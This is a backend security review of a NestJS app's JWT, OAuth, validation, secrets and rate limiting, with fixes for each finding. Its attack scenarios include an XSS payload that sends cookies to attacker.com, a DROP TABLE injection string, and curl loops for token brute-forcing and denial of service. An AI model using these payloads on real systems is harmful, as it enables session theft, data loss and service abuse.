# Phase 2: Security & Authentication Review

**Review Date:** 2025-12-23
**Reviewer:** Senior Backend Architect
**Overall Grade:** C+ (Significant security gaps that need immediate attention)

---

## Executive Summary

Your backend has **critical security vulnerabilities** that must be addressed before production deployment. While the OAuth integration with WorkOS is solid, there are significant gaps in input validation, rate limiting, token management, and security hardening. Several issues could lead to unauthorized access, data breaches, or service abuse.

**CRITICAL:** Do not deploy to production until Critical and High severity issues are resolved.

---

## Table of Contents

1. [JWT Implementation & Token Security](#1-jwt-implementation--token-security)
2. [Authorization & Access Controls](#2-authorization--access-controls)
3. [Input Validation & Sanitization](#3-input-validation--sanitization)
4. [Secrets Management](#4-secrets-management)
5. [Rate Limiting & Abuse Prevention](#5-rate-limiting--abuse-prevention)
6. [OAuth Integration Security](#6-oauth-integration-security)
7. [CORS & Cookie Security](#7-cors--cookie-security)
8. [Security Headers & Hardening](#8-security-headers--hardening)
9. [Summary of Findings](#9-summary-of-findings)
10. [Quick Wins](#10-quick-wins)
11. [Security Recommendations](#11-security-recommendations)

---

## 1. JWT Implementation & Token Security

### ✅ STRENGTHS

**1.1 Proper JWT Verification**
- Token verification uses `jwt.verify()` with secret validation (`auth.service.ts:97-103`)
- Throws `UnauthorizedException` on invalid/expired tokens
- Global JWT guard applied to all routes by default

**1.2 Token Extraction**
- Correctly extracts Bearer token from Authorization header (`jwt-auth.guard.ts:44-52`)
- Validates token type is "Bearer"

---

### ⚠️ ISSUES FOUND

#### Issue #S1: Weak JWT Secret in Example Configuration
**Severity:** CRITICAL
**File:** `.env.example:29`

**Problem:**
```bash
JWT_SECRET=your-super-secret-jwt-key-change-this-in-production
```

- Default JWT secret is a placeholder string
- Developers may forget to change it in production
- Weak secrets can be brute-forced
- No minimum length requirement enforced

**Recommendation:**
```bash
# .env.example
JWT_SECRET=REPLACE_WITH_RANDOM_256_BIT_KEY_GENERATE_WITH_openssl_rand_base64_32

# Add validation in auth.service.ts constructor:
constructor(private userService: UserService) {
  this.jwtSecret = process.env.JWT_SECRET;

  if (!this.jwtSecret) {
    throw new Error('JWT_SECRET is not set');
  }

  if (this.jwtSecret.length < 32) {
    throw new Error('JWT_SECRET must be at least 32 characters');
  }

  if (this.jwtSecret.includes('change-this') || this.jwtSecret.includes('example')) {
    throw new Error('JWT_SECRET must be changed from default value');
  }
}
```

**Action Items:**
- [ ] Update `.env.example` with clear instructions to generate random secret
- [ ] Add validation for JWT secret strength on startup
- [ ] Document secret generation in README: `openssl rand -base64 32`
- [ ] Add pre-deployment checklist requiring secret rotation

---

#### Issue #S2: Token in URL Query Parameter
**Severity:** CRITICAL
**File:** `src/auth/controllers/auth.controller.ts:54`

**Problem:**
```typescript
const redirectUrl = `${frontendUrl}/auth/callback?token=${accessToken}&state=${state || ''}`;
return res.redirect(redirectUrl);
```

- JWT token passed in URL query parameter during OAuth callback
- URLs are logged in browser history, server logs, and proxies
- Tokens can be leaked via Referer headers
- User may copy/share URL containing token

**OWASP:** A01:2021 - Broken Access Control

**Recommendation:**
Use HTTP-only cookies or POST redirect:

**Option 1: HTTP-Only Cookie (Recommended)**
```typescript
@Get('callback')
async callback(
  @Query('code') code: string,
  @Query('state') state: string,
  @Res() res: Response,
) {
  const { accessToken } = await this.authService.handleCallback(code);

  // Set HTTP-only cookie
  res.cookie('access_token', accessToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production', // HTTPS only in prod
    sameSite: 'lax',
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    path: '/',
  });

  // Redirect without token in URL
  const frontendUrl = process.env.FRONTEND_URL || 'http://localhost:5173';
  return res.redirect(`${frontendUrl}/auth/callback?state=${state || ''}`);
}
```

**Option 2: POST Redirect with Hidden Form**
```typescript
const html = `
  <html>
    <body>
      <form id="redirect" method="POST" action="${frontendUrl}/auth/callback">
        <input type="hidden" name="token" value="${accessToken}">
        <input type="hidden" name="state" value="${state}">
      </form>
      <script>document.getElementById('redirect').submit();</script>
    </body>
  </html>
`;
return res.send(html);
```

**Action Items:**
- [ ] Remove token from OAuth callback URL
- [ ] Implement HTTP-only cookie token storage
- [ ] Update frontend to read token from cookie
- [ ] Clear existing tokens in user browsers after migration

---

#### Issue #S3: No Refresh Token Mechanism
**Severity:** HIGH
**File:** `src/auth/services/auth.service.ts:85-95`

**Problem:**
```typescript
return jwt.sign(payload, this.jwtSecret, {
  expiresIn: '7d', // ⚠️ 7-day access token with no refresh mechanism
});
```

- Access tokens last 7 days (too long)
- No refresh token mechanism
- Stolen tokens remain valid for entire 7-day period
- No way to revoke tokens without changing global secret

**Best Practice:** Access tokens should be short-lived (15-30 minutes), with refresh tokens for longer sessions.

**Recommendation:**
Implement refresh token pattern:

```typescript
// auth.service.ts
interface TokenPair {
  accessToken: string;
  refreshToken: string;
}

generateTokenPair(user: User): TokenPair {
  const accessPayload: JwtPayload = {
    userId: user.id,
    email: user.email,
    workosUserId: user.workosUserId,
    type: 'access',
  };

  const refreshPayload = {
    userId: user.id,
    type: 'refresh',
    jti: uuidv4(), // Unique token ID for revocation
  };

  const accessToken = jwt.sign(accessPayload, this.jwtSecret, {
    expiresIn: '15m', // 15 minutes
  });

  const refreshToken = jwt.sign(refreshPayload, this.jwtSecret, {
    expiresIn: '7d', // 7 days
  });

  return { accessToken, refreshToken };
}

// Store refresh token JTI in database for revocation capability
async storeRefreshToken(userId: number, jti: string, expiresAt: Date) {
  await this.db.insert(refreshTokens).values({
    userId,
    jti,
    expiresAt,
    createdAt: new Date(),
  });
}

async refreshAccessToken(refreshToken: string): Promise<string> {
  const payload = this.verifyAccessToken(refreshToken);

  if (payload.type !== 'refresh') {
    throw new UnauthorizedException('Invalid token type');
  }

  // Check if refresh token is revoked
  const storedToken = await this.db.query.refreshTokens.findFirst({
    where: eq(refreshTokens.jti, payload.jti),
  });

  if (!storedToken || storedToken.revokedAt) {
    throw new UnauthorizedException('Token revoked');
  }

  const user = await this.userService.findById(payload.userId);
  return this.generateAccessToken(user);
}
```

**Action Items:**
- [ ] Create `refresh_tokens` database table
- [ ] Implement `POST /api/auth/refresh` endpoint
- [ ] Reduce access token lifetime to 15 minutes
- [ ] Update frontend to automatically refresh tokens
- [ ] Add token revocation mechanism

---

#### Issue #S4: No Token Revocation
**Severity:** HIGH
**File:** `src/auth/controllers/auth.controller.ts:80-88`

**Problem:**
```typescript
@Post('logout')
async logout() {
  return {
    message: 'Logged out successfully',
  };
}
```

- Logout endpoint does nothing server-side
- Token remains valid until expiration
- Cannot revoke compromised tokens
- No session management

**Recommendation:**
Implement token blacklist or session store:

```typescript
// Session-based approach (recommended)
@Post('logout')
async logout(@CurrentUser() user: User, @Req() request: Request) {
  const token = this.extractTokenFromHeader(request);

  // Add token to blacklist until expiration
  const decoded = this.authService.verifyAccessToken(token);
  const expiresAt = new Date(decoded.exp * 1000);

  await this.authService.revokeToken(token, expiresAt);

  return {
    message: 'Logged out successfully',
  };
}

// auth.service.ts
async revokeToken(token: string, expiresAt: Date) {
  const hash = crypto.createHash('sha256').update(token).digest('hex');

  await this.db.insert(revokedTokens).values({
    tokenHash: hash,
    expiresAt,
    revokedAt: new Date(),
  });
}

// Check revocation in JwtAuthGuard
async canActivate(context: ExecutionContext): Promise<boolean> {
  // ... existing code

  const isRevoked = await this.authService.isTokenRevoked(token);
  if (isRevoked) {
    throw new UnauthorizedException('Token has been revoked');
  }

  // ... continue
}
```

**Action Items:**
- [ ] Create `revoked_tokens` table
- [ ] Implement token revocation logic
- [ ] Check token blacklist in JWT guard
- [ ] Add automatic cleanup of expired revoked tokens (cron job)
- [ ] Consider Redis for faster blacklist lookups

---

#### Issue #S5: JWT Algorithm Not Specified
**Severity:** MEDIUM
**File:** `src/auth/services/auth.service.ts:92-94`

**Problem:**
```typescript
return jwt.sign(payload, this.jwtSecret, {
  expiresIn: '7d',
  // ⚠️ No algorithm specified, defaults to HS256
});
```

- JWT algorithm not explicitly specified
- Vulnerable to "none" algorithm attack if library misconfigured
- No protection against algorithm confusion attacks

**Recommendation:**
```typescript
return jwt.sign(payload, this.jwtSecret, {
  algorithm: 'HS256', // Explicitly specify algorithm
  expiresIn: '15m',
  issuer: 'sd-sim-api',
  audience: 'sd-sim-client',
});

// In verification
verifyAccessToken(token: string): JwtPayload {
  try {
    return jwt.verify(token, this.jwtSecret, {
      algorithms: ['HS256'], // Only allow HS256
      issuer: 'sd-sim-api',
      audience: 'sd-sim-client',
    }) as JwtPayload;
  } catch (error) {
    throw new UnauthorizedException('Invalid or expired token');
  }
}
```

**Action Items:**
- [ ] Explicitly specify JWT algorithm
- [ ] Add issuer and audience claims
- [ ] Verify algorithm in token verification
- [ ] Update JWT payload type to include standard claims

---

## 2. Authorization & Access Controls

### ✅ STRENGTHS

**2.1 Session Ownership Verification**
- Controller verifies session ownership before operations (`sessions.controller.ts:80-88`)
- Throws `ForbiddenException` (403) when user doesn't own resource
- Proper separation of authentication (401) and authorization (403)

**2.2 Global Auth Guard with Opt-Out**
- Global JWT guard protects all routes by default
- `@Public()` decorator allows explicit opt-out
- Fail-secure approach (deny by default)

---

### ⚠️ ISSUES FOUND

#### Issue #S6: No Role-Based Access Control (RBAC)
**Severity:** MEDIUM
**File:** User schema, JWT payload

**Problem:**
- No role/permission system
- All authenticated users have same privileges
- Cannot distinguish admin users from regular users
- No way to implement paid vs. free tier restrictions

**Recommendation:**
Add role-based access control:

```typescript
// users.schema.ts
export const users = pgTable('users', {
  // ... existing fields
  role: varchar('role', { length: 50 }).notNull().default('user'), // 'user', 'admin', 'moderator'
  permissions: jsonb('permissions').$type<string[]>().default([]), // ['create:session', 'view:analytics']
});

// JWT payload
export interface JwtPayload {
  userId: number;
  email: string;
  workosUserId: string;
  role: string; // Add role to token
}

// Create role guard
@Injectable()
export class RolesGuard implements CanActivate {
  constructor(private reflector: Reflector) {}

  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.getAllAndOverride<string[]>('roles', [
      context.getHandler(),
      context.getClass(),
    ]);

    if (!requiredRoles) {
      return true;
    }

    const { user } = context.switchToHttp().getRequest();
    return requiredRoles.includes(user.role);
  }
}

// Roles decorator
export const Roles = (...roles: string[]) => SetMetadata('roles', roles);

// Usage in controller
@Get('admin/analytics')
@Roles('admin', 'moderator')
async getAnalytics() {
  // Only admins and moderators can access
}
```

**Action Items:**
- [ ] Add `role` column to users table
- [ ] Create `RolesGuard` and `@Roles()` decorator
- [ ] Add role to JWT payload
- [ ] Implement permissions system for fine-grained control
- [ ] Document role hierarchy and permissions

---

#### Issue #S7: Subscription Enforcement Not Implemented
**Severity:** MEDIUM
**File:** `src/db/schema/users.schema.ts`, controllers

**Problem:**
```typescript
// User has subscription fields but they're not enforced
subscriptionStatus: varchar('subscription_status', { length: 50 }).default('free'),
interviewsCompleted: integer('interviews_completed').default(0),
interviewsRemaining: integer('interviews_remaining').default(1),
```

- Subscription limits exist in database but not enforced
- Free users could potentially create unlimited sessions
- No guard checking `interviewsRemaining` before session creation
- No payment integration

**Recommendation:**
```typescript
// subscription.guard.ts
@Injectable()
export class SubscriptionGuard implements CanActivate {
  constructor(private userService: UserService) {}

  async canActivate(context: ExecutionContext): Promise<boolean> {
    const request = context.switchToHttp().getRequest();
    const user = request.user;

    if (user.subscriptionStatus === 'paid' || user.subscriptionStatus === 'enterprise') {
      return true; // Unlimited access
    }

    // Check free tier limits
    if (user.interviewsRemaining <= 0) {
      throw new ForbiddenException({
        message: 'Interview limit reached',
        code: 'LIMIT_EXCEEDED',
        upgradeUrl: '/pricing',
      });
    }

    return true;
  }
}

// Apply to session creation
@Post()
@UseGuards(SubscriptionGuard)
async createSession(@CurrentUser() user: User, @Body() dto: CreateSessionDto) {
  const session = await this.sessionService.createSession({ ...dto, userId: user.id });

  // Decrement interviews remaining for free users
  if (user.subscriptionStatus === 'free') {
    await this.userService.decrementInterviewsRemaining(user.id);
  }

  return { success: true, data: { session } };
}
```

**Action Items:**
- [ ] Create `SubscriptionGuard` to enforce limits
- [ ] Apply guard to session creation endpoint
- [ ] Decrement `interviewsRemaining` after session creation
- [ ] Add webhook endpoint for payment provider (Stripe)
- [ ] Implement subscription management endpoints

---

#### Issue #S8: Horizontal Privilege Escalation Risk
**Severity:** MEDIUM
**File:** Multiple controllers

**Problem:**
While `verifySessionOwnership` is implemented, it's only called in `SessionsController`. Other resources may be vulnerable:

```typescript
// What if we add endpoints for:
// - GET /api/feedback/:feedbackId
// - GET /api/diagrams/:diagramId
// - GET /api/transcripts/:messageId

// These could be accessed without ownership checks
```

**Recommendation:**
Create reusable ownership verification service:

```typescript
// resource-ownership.service.ts
@Injectable()
export class ResourceOwnershipService {
  constructor(
    @Inject(DATABASE_CONNECTION) private db: typeof DbType,
  ) {}

  async verifySessionOwnership(sessionId: number, userId: number): Promise<void> {
    const session = await this.db.query.interviewSessions.findFirst({
      where: eq(interviewSessions.id, sessionId),
      columns: { userId: true },
    });

    if (!session || session.userId !== userId) {
      throw new ForbiddenException('Access denied');
    }
  }

  async verifyFeedbackOwnership(feedbackId: number, userId: number): Promise<void> {
    const feedback = await this.db.query.feedbackReports.findFirst({
      where: eq(feedbackReports.id, feedbackId),
      with: { session: { columns: { userId: true } } },
    });

    if (!feedback || feedback.session.userId !== userId) {
      throw new ForbiddenException('Access denied');
    }
  }

  // Add methods for other resources
}

// Create ownership guard
@Injectable()
export class OwnershipGuard implements CanActivate {
  constructor(private ownershipService: ResourceOwnershipService) {}

  async canActivate(context: ExecutionContext): Promise<boolean> {
    const request = context.switchToHttp().getRequest();
    const user = request.user;
    const resourceType = this.reflector.get<string>('resourceType', context.getHandler());
    const resourceId = parseInt(request.params.id);

    switch (resourceType) {
      case 'session':
        await this.ownershipService.verifySessionOwnership(resourceId, user.id);
        break;
      case 'feedback':
        await this.ownershipService.verifyFeedbackOwnership(resourceId, user.id);
        break;
      default:
        throw new Error(`Unknown resource type: ${resourceType}`);
    }

    return true;
  }
}

// Usage
@Get(':id/feedback')
@ResourceType('feedback')
@UseGuards(OwnershipGuard)
async getFeedback(@Param('id', ParseIntPipe) id: number) {
  // Ownership already verified by guard
}
```

**Action Items:**
- [ ] Create `ResourceOwnershipService` with ownership checks for all resources
- [ ] Create `OwnershipGuard` for declarative access control
- [ ] Apply ownership guards to all resource endpoints
- [ ] Write tests for horizontal privilege escalation attempts
- [ ] Document ownership verification patterns

---

## 3. Input Validation & Sanitization

### ❌ CRITICAL GAPS

**3.1 No Input Validation Library**
- `class-validator` is **NOT installed** (checked `package.json`)
- `class-transformer` is **NOT installed**
- DTOs have no validation decorators

---

### ⚠️ ISSUES FOUND

#### Issue #S9: No Input Validation
**Severity:** CRITICAL
**File:** All DTOs, `src/main.ts`

**Problem:**
```typescript
// create-session.dto.ts
export class CreateSessionDto {
  @ApiProperty({ description: 'Interview case ID', example: 1 })
  caseId: number; // ⚠️ No validation - accepts any value

  @ApiPropertyOptional({ enum: ['faang', 'startup', 'generic'] })
  companyStyle?: string; // ⚠️ No enum validation

  @ApiPropertyOptional({ enum: ['mid', 'senior', 'staff'] })
  level?: string; // ⚠️ No enum validation
}
```

- No validation decorators on any DTOs
- Accepts invalid data types (string where number expected)
- Accepts values outside allowed enum
- Accepts extremely large numbers or negative numbers
- No length limits on strings
- No global `ValidationPipe` configured

**Attack Scenarios:**
```bash
# SQL injection attempt (though Drizzle ORM protects against this)
POST /api/sessions
{ "caseId": "1'; DROP TABLE users; --" }

# Type confusion
POST /api/sessions
{ "caseId": "not a number" }

# Resource exhaustion
POST /api/sessions/:id/diagram
{ "nodes": [/* 1 million nodes */] }

# Invalid enum
POST /api/sessions
{ "caseId": 1, "companyStyle": "<script>alert('xss')</script>" }
```

**OWASP:** A03:2021 - Injection

**Recommendation:**

**Step 1: Install validation packages**
```bash
npm install class-validator class-transformer
```

**Step 2: Enable global validation pipe**
```typescript
// main.ts
import { ValidationPipe } from '@nestjs/common';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  app.useGlobalPipes(new ValidationPipe({
    whitelist: true, // Strip non-whitelisted properties
    forbidNonWhitelisted: true, // Throw error on non-whitelisted properties
    transform: true, // Automatically transform payloads to DTO instances
    transformOptions: {
      enableImplicitConversion: true, // Convert primitive types
    },
    validationError: {
      target: false, // Don't expose target class in errors
      value: false, // Don't expose value in errors (prevents data leaks)
    },
  }));

  // ... rest of bootstrap
}
```

**Step 3: Add validation decorators to all DTOs**
```typescript
import { IsInt, IsPositive, IsEnum, IsOptional, IsString, MaxLength } from 'class-validator';

export class CreateSessionDto {
  @ApiProperty({ description: 'Interview case ID', example: 1 })
  @IsInt({ message: 'Case ID must be an integer' })
  @IsPositive({ message: 'Case ID must be positive' })
  caseId: number;

  @ApiPropertyOptional({
    description: 'Company interview style',
    enum: ['faang', 'startup', 'generic'],
  })
  @IsOptional()
  @IsEnum(['faang', 'startup', 'generic'], {
    message: 'Company style must be one of: faang, startup, generic',
  })
  companyStyle?: string;

  @ApiPropertyOptional({
    description: 'Interview level',
    enum: ['mid', 'senior', 'staff'],
  })
  @IsOptional()
  @IsEnum(['mid', 'senior', 'staff'], {
    message: 'Level must be one of: mid, senior, staff',
  })
  level?: string;
}

// diagram.dto.ts
import { IsArray, ValidateNested, ArrayMaxSize } from 'class-validator';
import { Type } from 'class-transformer';

class DiagramNodeDto {
  @IsString()
  id: string;

  @IsString()
  type: string;

  // Add more specific validation for node structure
}

export class SaveDiagramDto {
  @ApiProperty()
  @IsArray()
  @ValidateNested({ each: true })
  @Type(() => DiagramNodeDto)
  @ArrayMaxSize(1000, { message: 'Diagram cannot have more than 1000 nodes' })
  nodes: DiagramNodeDto[];

  @ApiProperty()
  @IsArray()
  @ArrayMaxSize(2000, { message: 'Diagram cannot have more than 2000 edges' })
  edges: any[];
}
```

**Action Items:**
- [ ] Install `class-validator` and `class-transformer`
- [ ] Add `ValidationPipe` to `main.ts`
- [ ] Add validation decorators to all existing DTOs
- [ ] Create custom validators for complex business rules
- [ ] Write tests for validation scenarios
- [ ] Document validation rules in API documentation

---

#### Issue #S10: No Request Size Limits
**Severity:** HIGH
**File:** `src/main.ts`

**Problem:**
- No body size limits configured
- Attacker can send extremely large payloads
- Diagram endpoint accepts unlimited nodes/edges
- Transcript messages have no length limits
- Can cause memory exhaustion and DoS

**Attack Scenario:**
```bash
# Send 100MB JSON payload
POST /api/sessions/:id/diagram
Content-Length: 104857600
{ "nodes": [...], "edges": [...] }
```

**Recommendation:**
```typescript
// main.ts
import { json, urlencoded } from 'express';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Set request size limits
  app.use(json({ limit: '1mb' })); // Max 1MB JSON body
  app.use(urlencoded({ extended: true, limit: '1mb' }));

  // ... rest of bootstrap
}
```

**Add validation to DTOs:**
```typescript
export class SaveDiagramDto {
  @ArrayMaxSize(500, { message: 'Maximum 500 nodes allowed' })
  nodes: any[];

  @ArrayMaxSize(1000, { message: 'Maximum 1000 edges allowed' })
  edges: any[];
}
```

**Action Items:**
- [ ] Add request body size limits in `main.ts`
- [ ] Add array size limits to all DTOs with arrays
- [ ] Add string length limits to all text inputs
- [ ] Monitor request sizes in production
- [ ] Return clear error messages when limits exceeded

---

#### Issue #S11: XSS Vulnerability in User Content
**Severity:** HIGH
**File:** Transcript messages, feedback content

**Problem:**
- User messages stored without sanitization
- Feedback content contains user input
- No Content-Security-Policy headers
- Potential stored XSS if content rendered in admin panel

**Attack Scenario:**
```bash
POST /api/sessions/:id/conversation (via SSE)
text: "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"
```

If this message is rendered in an admin panel without escaping, the script executes.

**Recommendation:**

**Option 1: Sanitize on input (defense in depth)**
```bash
npm install dompurify @types/dompurify
```

```typescript
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

// Create sanitizer service
@Injectable()
export class SanitizationService {
  private window = new JSDOM('').window;
  private purify = DOMPurify(this.window);

  sanitizeHtml(dirty: string): string {
    return this.purify.sanitize(dirty, {
      ALLOWED_TAGS: [], // Strip all HTML tags
      ALLOWED_ATTR: [],
    });
  }

  sanitizeText(text: string): string {
    // Remove potential script injection
    return text
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
      .replace(/javascript:/gi, '')
      .replace(/on\w+\s*=/gi, '');
  }
}

// Use in controller
async handleConversation(@Body() dto: { text: string }) {
  const sanitizedText = this.sanitizationService.sanitizeText(dto.text);
  // ... process sanitized text
}
```

**Option 2: Content-Security-Policy headers (preferred)**
```typescript
// main.ts
import helmet from 'helmet';

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"], // Required for some UI libraries
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'"],
    fontSrc: ["'self'"],
    objectSrc: ["'none'"],
    mediaSrc: ["'self'"],
    frameSrc: ["'none'"],
  },
}));
```

**Action Items:**
- [ ] Install and configure Helmet.js
- [ ] Add Content-Security-Policy headers
- [ ] Sanitize user input before storage
- [ ] Escape output when rendering (frontend responsibility)
- [ ] Add XSS testing to security test suite

---

## 4. Secrets Management

### ⚠️ ISSUES FOUND

#### Issue #S12: Secrets in Environment Files
**Severity:** HIGH
**File:** `.env`, `.env.example`

**Problem:**
```bash
# All secrets in plaintext .env file
JWT_SECRET=your-super-secret-jwt-key-change-this-in-production
WORKOS_API_KEY=your_api_key_here
ANTHROPIC_API_KEY=your_api_key_here
```

- Secrets stored in plaintext files
- `.env` may be accidentally committed to git
- No secret rotation mechanism
- All secrets exposed if file system compromised
- No different secrets per environment

**Best Practice:** Use secret management service (AWS Secrets Manager, HashiCorp Vault, etc.)

**Recommendation:**

**Short-term (Better .env hygiene):**
```bash
# .gitignore (verify this exists)
.env
.env.local
.env.production

# .env.example (safe to commit)
JWT_SECRET=REQUIRED_GENERATE_WITH_openssl_rand_base64_32
WORKOS_API_KEY=REQUIRED
ANTHROPIC_API_KEY=REQUIRED

# Add validation
constructor() {
  const requiredEnvVars = [
    'JWT_SECRET',
    'WORKOS_API_KEY',
    'ANTHROPIC_API_KEY',
    'DATABASE_URL',
  ];

  const missing = requiredEnvVars.filter(v => !process.env[v]);
  if (missing.length > 0) {
    throw new Error(`Missing required environment variables: ${missing.join(', ')}`);
  }
}
```

**Long-term (Secrets Manager):**
```typescript
// secrets.service.ts
import { SecretsManager } from '@aws-sdk/client-secrets-manager';

@Injectable()
export class SecretsService {
  private client = new SecretsManager({ region: 'us-east-1' });

  async getSecret(name: string): Promise<string> {
    const response = await this.client.getSecretValue({
      SecretId: name,
    });
    return response.SecretString;
  }
}

// Use in auth.service.ts
constructor(private secretsService: SecretsService) {
  this.jwtSecret = await this.secretsService.getSecret('prod/jwt-secret');
}
```

**Action Items:**
- [ ] Verify `.env` is in `.gitignore`
- [ ] Scan git history for accidentally committed secrets (use `git-secrets`)
- [ ] Add environment variable validation on startup
- [ ] Document secret rotation procedures
- [ ] Migrate to AWS Secrets Manager or similar for production
- [ ] Use different secrets per environment (dev, staging, prod)

---

#### Issue #S13: Database Credentials in Plain Text
**Severity:** HIGH
**File:** `.env`

**Problem:**
```bash
DB_USER=postgres
DB_PASSWORD=postgres
```

- Database password in plaintext
- Same credentials in example file
- No indication that production needs stronger credentials

**Recommendation:**
```bash
# .env.example
DB_USER=REQUIRED
DB_PASSWORD=REQUIRED_STRONG_PASSWORD_MINIMUM_16_CHARS

# .env (for local dev only)
DB_USER=postgres
DB_PASSWORD=<generate-secure-password>
```

**Production:**
- Use IAM authentication (AWS RDS)
- Or store credentials in Secrets Manager
- Rotate credentials regularly

**Action Items:**
- [ ] Generate strong database password for all environments
- [ ] Use IAM database authentication in production
- [ ] Enable database connection encryption (SSL/TLS)
- [ ] Document credential rotation procedure

---

## 5. Rate Limiting & Abuse Prevention

### ❌ CRITICAL GAPS

**5.1 No Rate Limiting Package Installed**
- `@nestjs/throttler` is **NOT installed**
- No rate limiting on any endpoints
- Vulnerable to brute force, DoS, and resource exhaustion

---

### ⚠️ ISSUES FOUND

#### Issue #S14: No Rate Limiting
**Severity:** CRITICAL
**File:** All controllers, `src/main.ts`

**Problem:**
- No rate limiting on authentication endpoints
- No rate limiting on AI streaming endpoint
- Attacker can make unlimited requests
- Can exhaust AI API quota
- Can perform credential stuffing attacks

**Attack Scenarios:**
```bash
# Brute force JWT tokens (if secrets are weak)
for token in $(cat tokens.txt); do
  curl -H "Authorization: Bearer $token" http://api/sessions
done

# Exhaust AI API quota
while true; do
  curl http://api/sessions/1/conversation -d '{"text":"hello"}'
done

# Resource exhaustion
for i in {1..10000}; do
  curl -X POST http://api/sessions -d '{"caseId":1}' &
done
```

**OWASP:** A04:2021 - Insecure Design

**Recommendation:**

**Step 1: Install throttler**
```bash
npm install @nestjs/throttler
```

**Step 2: Configure global rate limiting**
```typescript
// app.module.ts
import { ThrottlerModule, ThrottlerGuard } from '@nestjs/throttler';
import { APP_GUARD } from '@nestjs/core';

@Module({
  imports: [
    ThrottlerModule.forRoot([
      {
        ttl: 60000, // 1 minute
        limit: 100, // 100 requests per minute per IP
      },
    ]),
    // ... other modules
  ],
  providers: [
    {
      provide: APP_GUARD,
      useClass: ThrottlerGuard,
    },
    // ... other providers
  ],
})
export class AppModule {}
```

**Step 3: Add stricter limits to sensitive endpoints**
```typescript
import { Throttle } from '@nestjs/throttler';

// Auth endpoints - strict limits
@Throttle({ default: { limit: 5, ttl: 60000 } }) // 5 requests per minute
@Post('login')
async login() { }

@Throttle({ default: { limit: 5, ttl: 60000 } })
@Get('callback')
async callback() { }

// AI streaming - prevent quota exhaustion
@Throttle({ default: { limit: 10, ttl: 60000 } }) // 10 conversations per minute
@Sse(':id/conversation')
handleConversationStream() { }

// Session creation - prevent spam
@Throttle({ default: { limit: 20, ttl: 60000 } }) // 20 sessions per minute
@Post()
async createSession() { }
```

**Step 4: Add user-based rate limiting (after authentication)**
```typescript
// custom-throttler.guard.ts
@Injectable()
export class UserThrottlerGuard extends ThrottlerGuard {
  protected async getTracker(req: Record<string, any>): Promise<string> {
    // Rate limit by user ID instead of IP for authenticated requests
    if (req.user) {
      return `user-${req.user.id}`;
    }
    // Fall back to IP for unauthenticated requests
    return req.ip;
  }
}
```

**Action Items:**
- [ ] Install `@nestjs/throttler`
- [ ] Configure global rate limiting (100 req/min per IP)
- [ ] Add strict rate limits to auth endpoints (5 req/min)
- [ ] Add rate limits to AI streaming endpoint (10 req/min)
- [ ] Add rate limits to session creation (20 req/min)
- [ ] Implement user-based rate limiting for authenticated routes
- [ ] Return proper 429 status with Retry-After header
- [ ] Monitor rate limit hits in production

---

#### Issue #S15: No Account Lockout Mechanism
**Severity:** MEDIUM
**File:** Auth flow

**Problem:**
- No protection against credential stuffing
- Unlimited login attempts via OAuth
- No temporary account suspension after suspicious activity

**Recommendation:**
```typescript
// Track failed auth attempts
@Injectable()
export class AuthAttemptTracker {
  private attempts = new Map<string, number>();
  private lockouts = new Map<string, Date>();

  async recordFailedAttempt(identifier: string): Promise<void> {
    const count = (this.attempts.get(identifier) || 0) + 1;
    this.attempts.set(identifier, count);

    if (count >= 5) {
      // Lock account for 15 minutes
      const lockUntil = new Date(Date.now() + 15 * 60 * 1000);
      this.lockouts.set(identifier, lockUntil);

      // TODO: Send email notification
      await this.notifyAccountLockout(identifier);
    }
  }

  async isLocked(identifier: string): Promise<boolean> {
    const lockUntil = this.lockouts.get(identifier);
    if (!lockUntil) return false;

    if (new Date() > lockUntil) {
      // Unlock
      this.lockouts.delete(identifier);
      this.attempts.delete(identifier);
      return false;
    }

    return true;
  }
}
```

**Action Items:**
- [ ] Implement auth attempt tracking
- [ ] Lock account after 5 failed attempts in 15 minutes
- [ ] Send email notification on account lockout
- [ ] Add CAPTCHA after 3 failed attempts
- [ ] Log suspicious auth patterns

---

## 6. OAuth Integration Security

### ✅ STRENGTHS

**6.1 WorkOS Integration**
- Uses established OAuth provider (WorkOS)
- Secure authorization code flow
- State parameter included for CSRF protection

---

### ⚠️ ISSUES FOUND

#### Issue #S16: State Parameter Not Validated
**Severity:** MEDIUM
**File:** `src/auth/controllers/auth.controller.ts:34-36, 41-61`

**Problem:**
```typescript
@Get('login')
login(@Query('state') state: string, @Res() res: Response) {
  const authorizationUrl = this.authService.getAuthorizationUrl(state);
  return res.redirect(authorizationUrl);
}

@Get('callback')
async callback(
  @Query('code') code: string,
  @Query('state') state: string, // ⚠️ Not validated
  @Res() res: Response,
) {
  // State is not checked against stored value
  const { accessToken } = await this.authService.handleCallback(code);
  const redirectUrl = `${frontendUrl}/auth/callback?token=${accessToken}&state=${state}`;
  return res.redirect(redirectUrl);
}
```

- State parameter passed through but never validated
- Doesn't prevent CSRF attacks
- State should be cryptographically random and verified

**OAuth 2.0 Security Best Practice:** The state parameter MUST be validated to prevent CSRF.

**Recommendation:**
```typescript
// auth.service.ts
import * as crypto from 'crypto';

private pendingStates = new Map<string, { userId?: number; expiresAt: Date }>();

generateState(userId?: number): string {
  const state = crypto.randomBytes(32).toString('base64url');
  this.pendingStates.set(state, {
    userId,
    expiresAt: new Date(Date.now() + 10 * 60 * 1000), // 10 minutes
  });
  return state;
}

validateState(state: string): boolean {
  const pending = this.pendingStates.get(state);

  if (!pending) {
    return false; // Invalid state
  }

  if (new Date() > pending.expiresAt) {
    this.pendingStates.delete(state);
    return false; // Expired
  }

  // State is valid, remove it (one-time use)
  this.pendingStates.delete(state);
  return true;
}

// auth.controller.ts
@Get('login')
login(@Res() res: Response) {
  const state = this.authService.generateState();
  const authorizationUrl = this.authService.getAuthorizationUrl(state);
  return res.redirect(authorizationUrl);
}

@Get('callback')
async callback(
  @Query('code') code: string,
  @Query('state') state: string,
